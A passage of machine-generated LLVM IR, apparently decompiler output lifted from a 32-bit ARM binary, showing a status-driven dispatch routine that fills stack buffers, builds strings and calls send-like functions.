  %v0_a210 = phi i32 [ %v0_a8ec, %dec_label_pc_a8ec ], [ %v0_a7dc, %dec_label_pc_a7dc ], [ %v0_a868, %dec_label_pc_a868 ], [ %v0_a20c, %dec_label_pc_a20c ]
  %stack_var_-2328.1 = phi i32 [ %stack_var_-2328.4, %dec_label_pc_a8ec ], [ %stack_var_-2328.7, %dec_label_pc_a7dc ], [ %stack_var_-2328.7, %dec_label_pc_a868 ], [ %stack_var_-2328.7, %dec_label_pc_a20c ]
  %stack_var_-2308.0 = phi i32 [ %stack_var_-2308.3, %dec_label_pc_a8ec ], [ %stack_var_-2308.6, %dec_label_pc_a7dc ], [ %stack_var_-2308.6, %dec_label_pc_a868 ], [ %stack_var_-2308.6, %dec_label_pc_a20c ]
  %stack_var_-2324.4 = phi i8 [ %stack_var_-2324.7, %dec_label_pc_a8ec ], [ %stack_var_-2324.10, %dec_label_pc_a7dc ], [ %stack_var_-2324.10, %dec_label_pc_a868 ], [ %stack_var_-2324.10, %dec_label_pc_a20c ]
  %stack_var_-2316.3 = phi i32 [ %stack_var_-2316.6, %dec_label_pc_a8ec ], [ %stack_var_-2316.9, %dec_label_pc_a7dc ], [ %stack_var_-2316.9, %dec_label_pc_a868 ], [ %stack_var_-2316.9, %dec_label_pc_a20c ]
  %stack_var_-2320.3 = phi i32 [ %stack_var_-2320.6, %dec_label_pc_a8ec ], [ %stack_var_-2320.9, %dec_label_pc_a7dc ], [ %stack_var_-2320.9, %dec_label_pc_a868 ], [ %stack_var_-2320.9, %dec_label_pc_a20c ]
  %stack_var_-2312.2 = phi i32 [ %stack_var_-2312.5, %dec_label_pc_a8ec ], [ %stack_var_-2312.8, %dec_label_pc_a7dc ], [ %stack_var_-2312.8, %dec_label_pc_a868 ], [ %stack_var_-2312.8, %dec_label_pc_a20c ]
  %v3_a210 = call i32 @function_9b20(i32 %v0_a210, i8 %v1_a210.off0)
  store i32 %v3_a210, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a914

dec_label_pc_a218:                                ; preds = %dec_label_pc_a1cc
  %v0_a218 = load i32, i32* @r7, align 4
  %v1_a218 = add i32 %v0_a218, 8
  %v2_a218 = inttoptr i32 %v1_a218 to i32*
  %v3_a218 = load i32, i32* %v2_a218, align 4
  store i32 %v3_a218, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v3_a218, i32* %r0.global-to-local, align 4
  %v2_a224 = call i32 @function_b790(i32 %v3_a218, i32 3)
  %v0_a228 = load i32, i32* @r5, align 4
  store i32 %v0_a228, i32* %r1.global-to-local, align 4
  %v1_a22c = and i32 %v2_a224, -2049
  store i32 %v1_a22c, i32* @r2, align 4
  %v0_a230 = load i32, i32* @r4, align 4
  store i32 %v0_a230, i32* %r0.global-to-local, align 4
  %v2_a234 = call i32 @function_b790(i32 %v0_a230, i32 %v0_a228)
  %v0_a238 = load i32, i32* @r7, align 4
  store i32 %v0_a238, i32* @r0, align 4
  store i32 2, i32* @r1, align 4
  br label %dec_label_pc_a900

dec_label_pc_a244:                                ; preds = %dec_label_pc_a178
  %v3_a244 = icmp eq i32 %v5_a1bc, -1
  %v8_a244 = icmp eq i32 %v5_a1bc, -1
  br i1 %v8_a244, label %.thread16, label %bb188

bb188:                                            ; preds = %dec_label_pc_a244
  %v1_a24c = load i32, i32* @r7, align 4
  store i32 %v1_a24c, i32* @r0, align 4
  br label %.thread16

.thread16:                                        ; preds = %dec_label_pc_a244, %bb188
  %storemerge132 = phi i32 [ 5, %bb188 ], [ %v1_a1c0, %dec_label_pc_a244 ]
  store i32 %storemerge132, i32* @r1, align 4
  %extract.t202 = trunc i32 %storemerge132 to i8
  br i1 %v3_a244, label %dec_label_pc_a20c, label %dec_label_pc_a910

dec_label_pc_a25c:                                ; preds = %dec_label_pc_9f0c
  %v0_a25c = load i32, i32* @sb, align 4
  %v7_a25c = icmp eq i32 %v0_a25c, 2
  br i1 %v7_a25c, label %.thread19, label %dec_label_pc_a26c

.thread19:                                        ; preds = %dec_label_pc_a25c
  store i32 %v0_9f6c, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  br label %dec_label_pc_a900

dec_label_pc_a26c:                                ; preds = %dec_label_pc_a25c
  %v7_a26c = icmp eq i32 %v0_a25c, 3
  br i1 %v7_a26c, label %.thread22, label %dec_label_pc_a27c

.thread22:                                        ; preds = %dec_label_pc_a26c
  store i32 %v0_9f6c, i32* @r0, align 4
  store i32 4, i32* @r1, align 4
  br label %dec_label_pc_a900

dec_label_pc_a27c:                                ; preds = %dec_label_pc_a26c
  %v7_a27c = icmp eq i32 %v0_a25c, 1
  br i1 %v7_a27c, label %.thread25, label %dec_label_pc_a28c

.thread25:                                        ; preds = %dec_label_pc_a27c
  store i32 %v0_9f6c, i32* @r0, align 4
  store i32 3, i32* @r1, align 4
  br label %dec_label_pc_a900

dec_label_pc_a28c:                                ; preds = %dec_label_pc_a27c
  %v7_a28c = icmp eq i32 %v0_a25c, 4
  br i1 %v7_a28c, label %.thread28, label %dec_label_pc_a2a0

.thread28:                                        ; preds = %dec_label_pc_a28c
  store i32 %v0_9f6c, i32* @r0, align 4
  store i32 5, i32* @r1, align 4
  br label %dec_label_pc_a900

dec_label_pc_a2a0:                                ; preds = %dec_label_pc_9e44, %dec_label_pc_9bd8.dec_label_pc_9eb4_crit_edge, %dec_label_pc_a28c
  %stack_var_-2328.2 = phi i32 [ %stack_var_-2328.7, %dec_label_pc_a28c ], [ %tmp136, %dec_label_pc_9bd8.dec_label_pc_9eb4_crit_edge ], [ %tmp136, %dec_label_pc_9e44 ]
  %stack_var_-2308.1 = phi i32 [ %stack_var_-2308.6, %dec_label_pc_a28c ], [ %tmp142, %dec_label_pc_9bd8.dec_label_pc_9eb4_crit_edge ], [ %tmp142, %dec_label_pc_9e44 ]
  %stack_var_-2324.5 = phi i8 [ %stack_var_-2324.10, %dec_label_pc_a28c ], [ %tmp143, %dec_label_pc_9bd8.dec_label_pc_9eb4_crit_edge ], [ %tmp143, %dec_label_pc_9e44 ]
  %stack_var_-2316.4 = phi i32 [ %stack_var_-2316.9, %dec_label_pc_a28c ], [ %tmp144, %dec_label_pc_9bd8.dec_label_pc_9eb4_crit_edge ], [ %tmp144, %dec_label_pc_9e44 ]
  %stack_var_-2320.4 = phi i32 [ %stack_var_-2320.9, %dec_label_pc_a28c ], [ %tmp145, %dec_label_pc_9bd8.dec_label_pc_9eb4_crit_edge ], [ %tmp145, %dec_label_pc_9e44 ]
  %stack_var_-2312.3 = phi i32 [ %stack_var_-2312.8, %dec_label_pc_a28c ], [ %tmp146, %dec_label_pc_9bd8.dec_label_pc_9eb4_crit_edge ], [ %v2_9c2c, %dec_label_pc_9e44 ]
  %storemerge4 = phi i32 [ 0, %dec_label_pc_a28c ], [ %v0_9eb4.pre, %dec_label_pc_9bd8.dec_label_pc_9eb4_crit_edge ], [ %v0_9c48, %dec_label_pc_9e44 ]
  store i32 %storemerge4, i32* %r0.global-to-local, align 4
  %v1_a2a0 = call i32 @function_c798(i32 %storemerge4)
  store i32 %v1_a2a0, i32* %r0.global-to-local, align 4
  %v0_a2a4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_a2a4

dec_label_pc_a2a4:                                ; preds = %dec_label_pc_9f0c, %dec_label_pc_a2a0
  %v0_a2cc = phi i32 [ %v0_a2a4.pre, %dec_label_pc_a2a0 ], [ %v0_9f6c, %dec_label_pc_9f0c ]
  %stack_var_-2328.3 = phi i32 [ %stack_var_-2328.2, %dec_label_pc_a2a0 ], [ %stack_var_-2328.7, %dec_label_pc_9f0c ]
  %stack_var_-2308.2 = phi i32 [ %stack_var_-2308.1, %dec_label_pc_a2a0 ], [ %stack_var_-2308.6, %dec_label_pc_9f0c ]
  %stack_var_-2324.6 = phi i8 [ %stack_var_-2324.5, %dec_label_pc_a2a0 ], [ %stack_var_-2324.10, %dec_label_pc_9f0c ]
  %stack_var_-2316.5 = phi i32 [ %stack_var_-2316.4, %dec_label_pc_a2a0 ], [ %stack_var_-2316.9, %dec_label_pc_9f0c ]
  %stack_var_-2320.5 = phi i32 [ %stack_var_-2320.4, %dec_label_pc_a2a0 ], [ %stack_var_-2320.9, %dec_label_pc_9f0c ]
  %stack_var_-2312.4 = phi i32 [ %stack_var_-2312.3, %dec_label_pc_a2a0 ], [ %stack_var_-2312.8, %dec_label_pc_9f0c ]
  %v1_a2a4 = add i32 %v0_a2cc, 17
  %v2_a2a4 = inttoptr i32 %v1_a2a4 to i8*
  %v3_a2a4 = load i8, i8* %v2_a2a4, align 1
  %v4_a2a4 = zext i8 %v3_a2a4 to i32
  store i32 %v4_a2a4, i32* %r3.global-to-local, align 4
  %v7_a2a8 = icmp eq i8 %v3_a2a4, 2
  br i1 %v7_a2a8, label %.thread31, label %dec_label_pc_a2b8

.thread31:                                        ; preds = %dec_label_pc_a2a4
  store i32 %v0_a2cc, i32* @r0, align 4
  store i32 12, i32* @r1, align 4
  br label %dec_label_pc_a900

dec_label_pc_a2b8:                                ; preds = %dec_label_pc_a2a4
  %v7_a2b8 = icmp eq i8 %v3_a2a4, 3
  br i1 %v7_a2b8, label %.thread34, label %dec_label_pc_a2c8

.thread34:                                        ; preds = %dec_label_pc_a2b8
  store i32 %v0_a2cc, i32* @r0, align 4
  store i32 14, i32* @r1, align 4
  br label %dec_label_pc_a900

dec_label_pc_a2c8:                                ; preds = %dec_label_pc_a2b8
  store i32 ptrtoint ([18 x i8]* @global_var_e3fc.167 to i32), i32* %r1.global-to-local, align 4
  %v1_a2cc = add i32 %v0_a2cc, 8
  %v2_a2cc = inttoptr i32 %v1_a2cc to i32*
  %v3_a2cc = load i32, i32* %v2_a2cc, align 4
  store i32 %v3_a2cc, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_a2d8 = call i32 @function_c04c(i32 %v3_a2cc, i32* bitcast ([18 x i8]* @global_var_e3fc.167 to i32*), i32 17, i32 16384)
  store i32 %v6_a2d8, i32* %r0.global-to-local, align 4
  %tmp189 = icmp slt i32 %v6_a2d8, 1
  br i1 %tmp189, label %dec_label_pc_a8ec, label %.thread118

.thread118:                                       ; preds = %dec_label_pc_a2c8
  %v5_a2e0 = load i32, i32* @r7, align 4
  store i32 %v5_a2e0, i32* @r0, align 4
  store i32 9, i32* @r1, align 4
  br label %dec_label_pc_a900

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_9f0c
  store i32 %v0_9f6c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_e410.169 to i32), i32* %r1.global-to-local, align 4
  %v3_a2f8 = call i32 @function_9a20(i32 %v0_9f6c, i32 ptrtoint ([10 x i8]* @global_var_e410.169 to i32))
  store i32 %v3_a2f8, i32* %r0.global-to-local, align 4
  store i32 %v3_a2f8, i32* @sl, align 4
  %v2_a2fc = icmp eq i32 %v3_a2f8, 0
  br i1 %v2_a2fc, label %dec_label_pc_a6a4, label %dec_label_pc_a304

dec_label_pc_a304:                                ; preds = %dec_label_pc_a2f0
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_a30c = call i32 @function_c34c(i32 4, i32 4)
  %v1_a310 = load i32, i32* @r7, align 4
  %v2_a310 = add i32 %v1_a310, 1044
  %v3_a310 = inttoptr i32 %v2_a310 to i32*
  store i32 %v2_a30c, i32* %v3_a310, align 4
  %v0_a318 = load i32, i32* @r7, align 4
  %v1_a318 = add i32 %v0_a318, 18
  store i32 %v1_a318, i32* @r5, align 4
  store i32 ptrtoint ([18 x i8]* @global_var_f268.171 to i32), i32* @r1, align 4
  store i32 8, i32* @r2, align 4
  %v2_a324 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_a324, i32* @r0, align 4
  %v4_a328 = call i32 @function_be20(i32 %v2_a324, i32 ptrtoint ([18 x i8]* @global_var_f268.171 to i32), i32 8)
  %v0_a32c = load i32, i32* @r5, align 4
  store i32 %v0_a32c, i32* @r0, align 4
  %v0_a330 = call i32 @function_ab0c()
  %v0_a334 = load i32, i32* @r5, align 4
  %v1_a334 = load i32, i32* @sl, align 4
  %v2_a334 = add i32 %v1_a334, %v0_a334
  store i32 %v2_a334, i32* @r1, align 4
  store i32 %v0_a330, i32* @r2, align 4
  store i32 %v0_a334, i32* @r0, align 4
  %v3_a340 = call i32 @function_be30(i32 %v0_a334, i32 %v2_a334, i32 %v0_a330)
  store i32 %v3_a340, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  %v1_a37854.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_a390

dec_label_pc_a34c:                                ; preds = %dec_label_pc_a390, %.thread39.dec_label_pc_a34c_crit_edge
  %v1_a364 = phi i32 [ %v1_a374, %.thread39.dec_label_pc_a34c_crit_edge ], [ %v0_a390, %dec_label_pc_a390 ]
  %v1_a358 = phi i32 [ %v1_a358.pre, %.thread39.dec_label_pc_a34c_crit_edge ], [ %v0_a390, %dec_label_pc_a390 ]
  %v1_a368 = phi i32 [ %v1_a370, %.thread39.dec_label_pc_a34c_crit_edge ], [ 0, %dec_label_pc_a390 ]
  %v0_a354 = phi i32 [ %v0_a354.pre, %.thread39.dec_label_pc_a34c_crit_edge ], [ %v0_a35497, %dec_label_pc_a390 ]
  store i32 %v2_a324, i32* %r3.global-to-local, align 4
  %v2_a354 = add i32 %v0_a354, %v2_a324
  %v3_a354 = inttoptr i32 %v2_a354 to i8*
  %v4_a354 = load i8, i8* %v3_a354, align 1
  %v2_a358 = add i32 %v1_a368, %v1_a358
  %v3_a358 = inttoptr i32 %v2_a358 to i8*
  %v4_a358 = load i8, i8* %v3_a358, align 1
  %v6_a358 = zext i8 %v4_a358 to i32
  store i32 %v6_a358, i32* %r3.global-to-local, align 4
  %v9_a35c = icmp eq i8 %v4_a358, %v4_a354
  br i1 %v9_a35c, label %bb190, label %.thread39

bb190:                                            ; preds = %dec_label_pc_a34c
  store i32 %v1_a364, i32* %r0.global-to-local, align 4
  %v2_a364 = add i32 %v1_a364, 1
  store i32 %v2_a364, i32* %r1.global-to-local, align 4
  br label %.thread39

.thread39:                                        ; preds = %dec_label_pc_a34c, %bb190
  store i32 41840, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v9_a35c, i32 ptrtoint (i32* @global_var_be30.172 to i32))
  %v0_a370 = load i32, i32* %r4.global-to-local, align 4
  %v1_a370 = add i32 %v0_a370, 1
  store i32 %v1_a370, i32* %r4.global-to-local, align 4
  %v0_a374 = load i32, i32* %r6.global-to-local, align 4
  %v1_a374 = add i32 %v0_a374, 1
  store i32 %v1_a374, i32* %r6.global-to-local, align 4
  %v1_a378 = load i32, i32* @sl, align 4
  %v5_a37c = icmp slt i32 %v1_a370, %v1_a378
  %v0_a354.pre = load i32, i32* @r8, align 4
  br i1 %v5_a37c, label %.thread39.dec_label_pc_a34c_crit_edge, label %dec_label_pc_a380

.thread39.dec_label_pc_a34c_crit_edge:            ; preds = %.thread39
  %v1_a358.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a34c

dec_label_pc_a380:                                ; preds = %.thread39, %dec_label_pc_a390
  %v0_a380 = phi i32 [ %v0_a35497, %dec_label_pc_a390 ], [ %v0_a354.pre, %.thread39 ]
  %v1_a3785494 = phi i32 [ %v1_a37854, %dec_label_pc_a390 ], [ %v1_a378, %.thread39 ]
  %v1_a380 = add i32 %v0_a380, 1
  store i32 %v1_a380, i32* @r8, align 4
  %v7_a384 = icmp eq i32 %v1_a380, 8
  br i1 %v7_a384, label %dec_label_pc_a3d4.preheader, label %dec_label_pc_a390

dec_label_pc_a3d4.preheader:                      ; preds = %dec_label_pc_a380
  store i32 0, i32* @r6, align 4
  %v0_a3d4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a3d4

dec_label_pc_a390:                                ; preds = %dec_label_pc_a380, %dec_label_pc_a304
  %v0_a35497 = phi i32 [ 0, %dec_label_pc_a304 ], [ %v1_a380, %dec_label_pc_a380 ]
  %v1_a37854 = phi i32 [ %v1_a37854.pre, %dec_label_pc_a304 ], [ %v1_a3785494, %dec_label_pc_a380 ]
  %v0_a390 = load i32, i32* @r5, align 4
  store i32 %v0_a390, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v5_a37c63 = icmp sgt i32 %v1_a37854, 0
  br i1 %v5_a37c63, label %dec_label_pc_a34c, label %dec_label_pc_a380

dec_label_pc_a39c:                                ; preds = %dec_label_pc_a3d4
  %v0_a39c = call i32 @function_ab0c()
  %v1_a3a0 = add i32 %v0_a39c, 1
  store i32 %v1_a3a0, i32* %r0.global-to-local, align 4
  %v1_a3a4 = call i32 @function_c1f8(i32 %v1_a3a0)
  store i32 %v1_a3a4, i32* %r0.global-to-local, align 4
  %v0_a3a8 = load i32, i32* @r7, align 4
  %v1_a3a8 = add i32 %v0_a3a8, 1044
  %v2_a3a8 = inttoptr i32 %v1_a3a8 to i32*
  %v3_a3a8 = load i32, i32* %v2_a3a8, align 4
  store i32 %v3_a3a8, i32* %r3.global-to-local, align 4
  %v1_a3ac = load i32, i32* @r6, align 4
  %v2_a3ac = load i32, i32* @r4, align 4
  %v3_a3ac = add i32 %v2_a3ac, %v1_a3ac
  %v4_a3ac = inttoptr i32 %v3_a3ac to i32*
  store i32 %v1_a3a4, i32* %v4_a3ac, align 4
  %v0_a3b0 = load i32, i32* @r5, align 4
  store i32 %v0_a3b0, i32* @r0, align 4
  %v0_a3b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a3b4 = load i32, i32* @r6, align 4
  %v2_a3b4 = add i32 %v1_a3b4, %v0_a3b4
  %v3_a3b4 = inttoptr i32 %v2_a3b4 to i32*
  %v4_a3b4 = load i32, i32* %v3_a3b4, align 4
  store i32 %v4_a3b4, i32* %r4.global-to-local, align 4
  %v0_a3b8 = call i32 @function_ab0c()
  %v0_a3bc = load i32, i32* @r5, align 4
  store i32 %v0_a3bc, i32* %r1.global-to-local, align 4
  store i32 %v0_a3b8, i32* @r2, align 4
  store i32 %v4_a3b4, i32* %r0.global-to-local, align 4
  %v3_a3c8 = call i32 @function_ab58(i32 %v4_a3b4, i32 %v0_a3bc, i32 %v0_a3b8)
  store i32 %v3_a3c8, i32* %r0.global-to-local, align 4
  %v0_a3cc = load i32, i32* @r6, align 4
  %v1_a3cc = add i32 %v0_a3cc, 4
  store i32 %v1_a3cc, i32* @r6, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_a3d4

dec_label_pc_a3d4:                                ; preds = %dec_label_pc_a3d4.preheader, %dec_label_pc_a39c
  %v0_a3d4 = phi i32 [ %v0_a3d4.pre, %dec_label_pc_a3d4.preheader ], [ 0, %dec_label_pc_a39c ]
  store i32 %v0_a3d4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_e41c.174 to i32), i32* %r1.global-to-local, align 4
  %v3_a3dc = call i32 @function_abc4(i32 %v0_a3d4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_e41c.174, i32 0, i32 0))
  store i32 %v3_a3dc, i32* @r0, align 4
  store i32 %v3_a3dc, i32* @r5, align 4
  %v2_a3e0 = icmp eq i32 %v3_a3dc, 0
  %v0_a3e4 = load i32, i32* @r7, align 4
  %v1_a3e4 = add i32 %v0_a3e4, 1044
  %v2_a3e4 = inttoptr i32 %v1_a3e4 to i32*
  %v3_a3e4 = load i32, i32* %v2_a3e4, align 4
  store i32 %v3_a3e4, i32* @r4, align 4
  br i1 %v2_a3e0, label %dec_label_pc_a3ec, label %dec_label_pc_a39c

dec_label_pc_a3ec:                                ; preds = %dec_label_pc_a3d4
  %v1_a3ec = add i32 %v3_a3e4, 4
  %v2_a3ec = inttoptr i32 %v1_a3ec to i32*
  %v3_a3ec = load i32, i32* %v2_a3ec, align 4
  store i32 %v3_a3ec, i32* @r4, align 4
  store i32 %v3_a3ec, i32* @r0, align 4
  %v0_a3f4 = call i32 @function_ab0c()
  %v0_a3f8 = load i32, i32* @r4, align 4
  %v1_a3f8 = add i32 %v0_a3f8, 12
  store i32 %v1_a3f8, i32* @r1, align 4
  store i32 %v0_a3f4, i32* @r2, align 4
  store i32 %v0_a3f8, i32* @r0, align 4
  %v3_a404 = call i32 @function_be30(i32 %v0_a3f8, i32 %v1_a3f8, i32 %v0_a3f4)
  store i32 %v3_a404, i32* %r0.global-to-local, align 4
  %v0_a408 = load i32, i32* @r7, align 4
  %v1_a408 = add i32 %v0_a408, 1044
  %v2_a408 = inttoptr i32 %v1_a408 to i32*
  %v3_a408 = load i32, i32* %v2_a408, align 4
  store i32 %v3_a408, i32* %r3.global-to-local, align 4
  %v2_a40c = icmp eq i32 %v3_a408, 0
  br i1 %v2_a40c, label %dec_label_pc_a8ec, label %dec_label_pc_a7dc

dec_label_pc_a418:                                ; preds = %dec_label_pc_9f0c
  %v2_a41c = ptrtoint i32* %stack_var_-2304 to i32
  store i32 %v2_a41c, i32* @r4, align 4
  store i32 1024, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_a41c, i32* %r0.global-to-local, align 4
  %v3_a42c = call i32 @function_aba4(i32 %v2_a41c, i32 0, i32 1024)
  store i32 ptrtoint ([27 x i8]* @global_var_e420.176 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_a41c, i32* @r0, align 4
  %v3_a438 = call i32 @function_ab78(i32 %v2_a41c, i32 ptrtoint ([27 x i8]* @global_var_e420.176 to i32))
  store i32 %v3_a438, i32* %r0.global-to-local, align 4
  %v0_a43c = load i32, i32* @r7, align 4
  %v1_a43c = add i32 %v0_a43c, 1044
  %v2_a43c = inttoptr i32 %v1_a43c to i32*
  %v3_a43c = load i32, i32* %v2_a43c, align 4
  store i32 %v3_a43c, i32* %r3.global-to-local, align 4
  store i32 %v2_a41c, i32* %r0.global-to-local, align 4
  %v1_a444 = inttoptr i32 %v3_a43c to i32*
  %v2_a444 = load i32, i32* %v1_a444, align 4
  store i32 %v2_a444, i32* @r1, align 4
  %v2_a448 = bitcast i32* %stack_var_-2304 to i8*
  %v3_a448 = call i32 @function_ab2c(i8* %v2_a448, i32 %v2_a444)
  store i32 ptrtoint ([11 x i8]* @global_var_e43c.178 to i32), i32* @r1, align 4
  store i32 %v2_a41c, i32* %r0.global-to-local, align 4
  %v4_a454 = call i32 @function_ab2c(i8* %v2_a448, i32 ptrtoint ([11 x i8]* @global_var_e43c.178 to i32))
  store i32 %v4_a454, i32* %r0.global-to-local, align 4
  %v0_a458 = load i32, i32* @r7, align 4
  %v1_a458 = add i32 %v0_a458, 1044
  %v2_a458 = inttoptr i32 %v1_a458 to i32*
  %v3_a458 = load i32, i32* %v2_a458, align 4
  store i32 %v3_a458, i32* %r3.global-to-local, align 4
  store i32 %v2_a41c, i32* %r0.global-to-local, align 4
  %v1_a460 = add i32 %v3_a458, 4
  %v2_a460 = inttoptr i32 %v1_a460 to i32*
  %v3_a460 = load i32, i32* %v2_a460, align 4
  store i32 %v3_a460, i32* @r1, align 4
  %v3_a464 = call i32 @function_ab2c(i8* %v2_a448, i32 %v3_a460)
  store i32 %v2_a41c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([88 x i8]* @global_var_e448.180 to i32), i32* @r1, align 4
  %v4_a470 = call i32 @function_ab2c(i8* %v2_a448, i32 ptrtoint ([88 x i8]* @global_var_e448.180 to i32))
  store i32 %v4_a470, i32* %r0.global-to-local, align 4
  %v0_a478 = load i32, i32* @r7, align 4
  %v1_a478 = add i32 %v0_a478, 1042
  %v2_a478 = inttoptr i32 %v1_a478 to i8*
  %v3_a478 = load i8, i8* %v2_a478, align 1
  %v4_a478 = zext i8 %v3_a478 to i32
  %v2_a47c = load i32, i32* @global_var_17444.156, align 4
  store i32 %v2_a47c, i32* @r6, align 4
  %v1_a480 = add nuw nsw i32 %v4_a478, 1
  store i32 %v1_a480, i32* %r3.global-to-local, align 4
  %v1_a484 = urem i32 %v1_a480, 256
  %v2_a4ac65 = icmp eq i32 %v2_a47c, 0
  br i1 %v2_a4ac65, label %dec_label_pc_a4b4, label %dec_label_pc_a48c

dec_label_pc_a48c:                                ; preds = %dec_label_pc_a418, %dec_label_pc_a4a8
  %v0_a4a8 = phi i32 [ %v3_a4a8, %dec_label_pc_a4a8 ], [ %v2_a47c, %dec_label_pc_a418 ]
  %v1_a48c = inttoptr i32 %v0_a4a8 to i32*
  %v2_a48c = load i32, i32* %v1_a48c, align 4
  %v1_a490 = urem i32 %v2_a48c, 16777216
  store i32 %v1_a490, i32* %r3.global-to-local, align 4
  %v2_a494 = icmp eq i32 %v1_a490, 0
  br i1 %v2_a494, label %dec_label_pc_a4a8, label %dec_label_pc_a49c

dec_label_pc_a49c:                                ; preds = %dec_label_pc_a48c
  %v1_a49c = add i32 %v0_a4a8, 2
  %v2_a49c = inttoptr i32 %v1_a49c to i8*
  %v3_a49c = load i8, i8* %v2_a49c, align 1
  %v4_a49c = zext i8 %v3_a49c to i32
  store i32 %v4_a49c, i32* %r3.global-to-local, align 4
  %v9_a4a0 = icmp eq i32 %v4_a49c, %v1_a484
  br i1 %v9_a4a0, label %dec_label_pc_a4b8, label %dec_label_pc_a4a8

dec_label_pc_a4a8:                                ; preds = %dec_label_pc_a49c, %dec_label_pc_a48c
  %v1_a4a8 = add i32 %v0_a4a8, 8
  %v2_a4a8 = inttoptr i32 %v1_a4a8 to i32*
  %v3_a4a8 = load i32, i32* %v2_a4a8, align 4
  store i32 %v3_a4a8, i32* @r6, align 4
  %v2_a4ac = icmp eq i32 %v3_a4a8, 0
  br i1 %v2_a4ac, label %dec_label_pc_a4b4, label %dec_label_pc_a48c

dec_label_pc_a4b4:                                ; preds = %dec_label_pc_a4a8, %dec_label_pc_a418
  store i32 %stack_var_-2328.7, i32* @r6, align 4
  br label %dec_label_pc_a4b8

dec_label_pc_a4b8:                                ; preds = %dec_label_pc_a49c, %dec_label_pc_a4b4
  %v0_a4c0 = phi i32 [ %stack_var_-2328.7, %dec_label_pc_a4b4 ], [ %v0_a4a8, %dec_label_pc_a49c ]
  store i32 %v2_a41c, i32* @r4, align 4
  %v1_a4c0 = add i32 %v0_a4c0, 4
  %v2_a4c0 = inttoptr i32 %v1_a4c0 to i32*
  %v3_a4c0 = load i32, i32* %v2_a4c0, align 4
  store i32 %v3_a4c0, i32* @r1, align 4
  store i32 %v2_a41c, i32* %r0.global-to-local, align 4
  %v3_a4c8 = call i32 @function_ab2c(i8* %v2_a448, i32 %v3_a4c0)
  store i32 ptrtoint ([17 x i8]* @global_var_e4a0.182 to i32), i32* @r1, align 4
  store i32 %v2_a41c, i32* %r0.global-to-local, align 4
  %v4_a4d4 = call i32 @function_ab2c(i8* %v2_a448, i32 ptrtoint ([17 x i8]* @global_var_e4a0.182 to i32))
  store i32 %v2_a41c, i32* @r0, align 4
  %v0_a4dc = load i32, i32* @r7, align 4
  %v1_a4dc = add i32 %v0_a4dc, 8
  %v2_a4dc = inttoptr i32 %v1_a4dc to i32*
  %v3_a4dc = load i32, i32* %v2_a4dc, align 4
  store i32 %v3_a4dc, i32* @r5, align 4
  %v0_a4e0 = call i32 @function_ab0c()
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_a41c, i32* %r1.global-to-local, align 4
  %v0_a4f0 = load i32, i32* @r5, align 4
  store i32 %v0_a4f0, i32* %r0.global-to-local, align 4
  %v5_a4f4 = call i32 @function_c04c(i32 %v0_a4f0, i32* nonnull %stack_var_-2304, i32 %v0_a4e0, i32 16384)
  store i32 %v5_a4f4, i32* %r0.global-to-local, align 4
  %tmp191 = icmp slt i32 %v5_a4f4, 1
  %v5_a504 = load i32, i32* @r7, align 4
  br i1 %tmp191, label %.thread127, label %bb192

.thread127:                                       ; preds = %dec_label_pc_a4b8
  store i32 %v5_a504, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %bb193

bb192:                                            ; preds = %dec_label_pc_a4b8
  %v6_a4fc = add i32 %v5_a504, 1042
  %v7_a4fc = inttoptr i32 %v6_a4fc to i8*
  %v8_a4fc = load i8, i8* %v7_a4fc, align 1
  %v9_a4fc = zext i8 %v8_a4fc to i32
  %v6_a500 = add nuw nsw i32 %v9_a4fc, 1
  store i32 %v6_a500, i32* %r3.global-to-local, align 4
  store i32 %v5_a504, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v6_a514 = trunc i32 %v6_a500 to i8
  store i8 %v6_a514, i8* %v7_a4fc, align 1
  %v0_a518.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_a518.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t218 = trunc i32 %v1_a518.pre to i8
  br label %bb193

bb193:                                            ; preds = %.thread127, %bb192
  %v1_a518.off0 = phi i8 [ %extract.t218, %bb192 ], [ 1, %.thread127 ]
  %v0_a518 = phi i32 [ %v0_a518.pre, %bb192 ], [ %v5_a504, %.thread127 ]
  %v3_a518 = call i32 @function_9b20(i32 %v0_a518, i8 %v1_a518.off0)
  store i32 %v3_a518, i32* %r0.global-to-local, align 4
  %v0_a51c = load i32, i32* @r6, align 4
  br label %dec_label_pc_a914

dec_label_pc_a524:                                ; preds = %dec_label_pc_9f0c
  %v2_a528 = ptrtoint i32* %stack_var_-2304 to i32
  store i32 %v2_a528, i32* @r4, align 4
  store i32 1024, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_a528, i32* %r0.global-to-local, align 4
  %v3_a538 = call i32 @function_aba4(i32 %v2_a528, i32 0, i32 1024)
  store i32 ptrtoint ([27 x i8]* @global_var_e4b4.184 to i32), i32* %r1.global-to-local, align 4
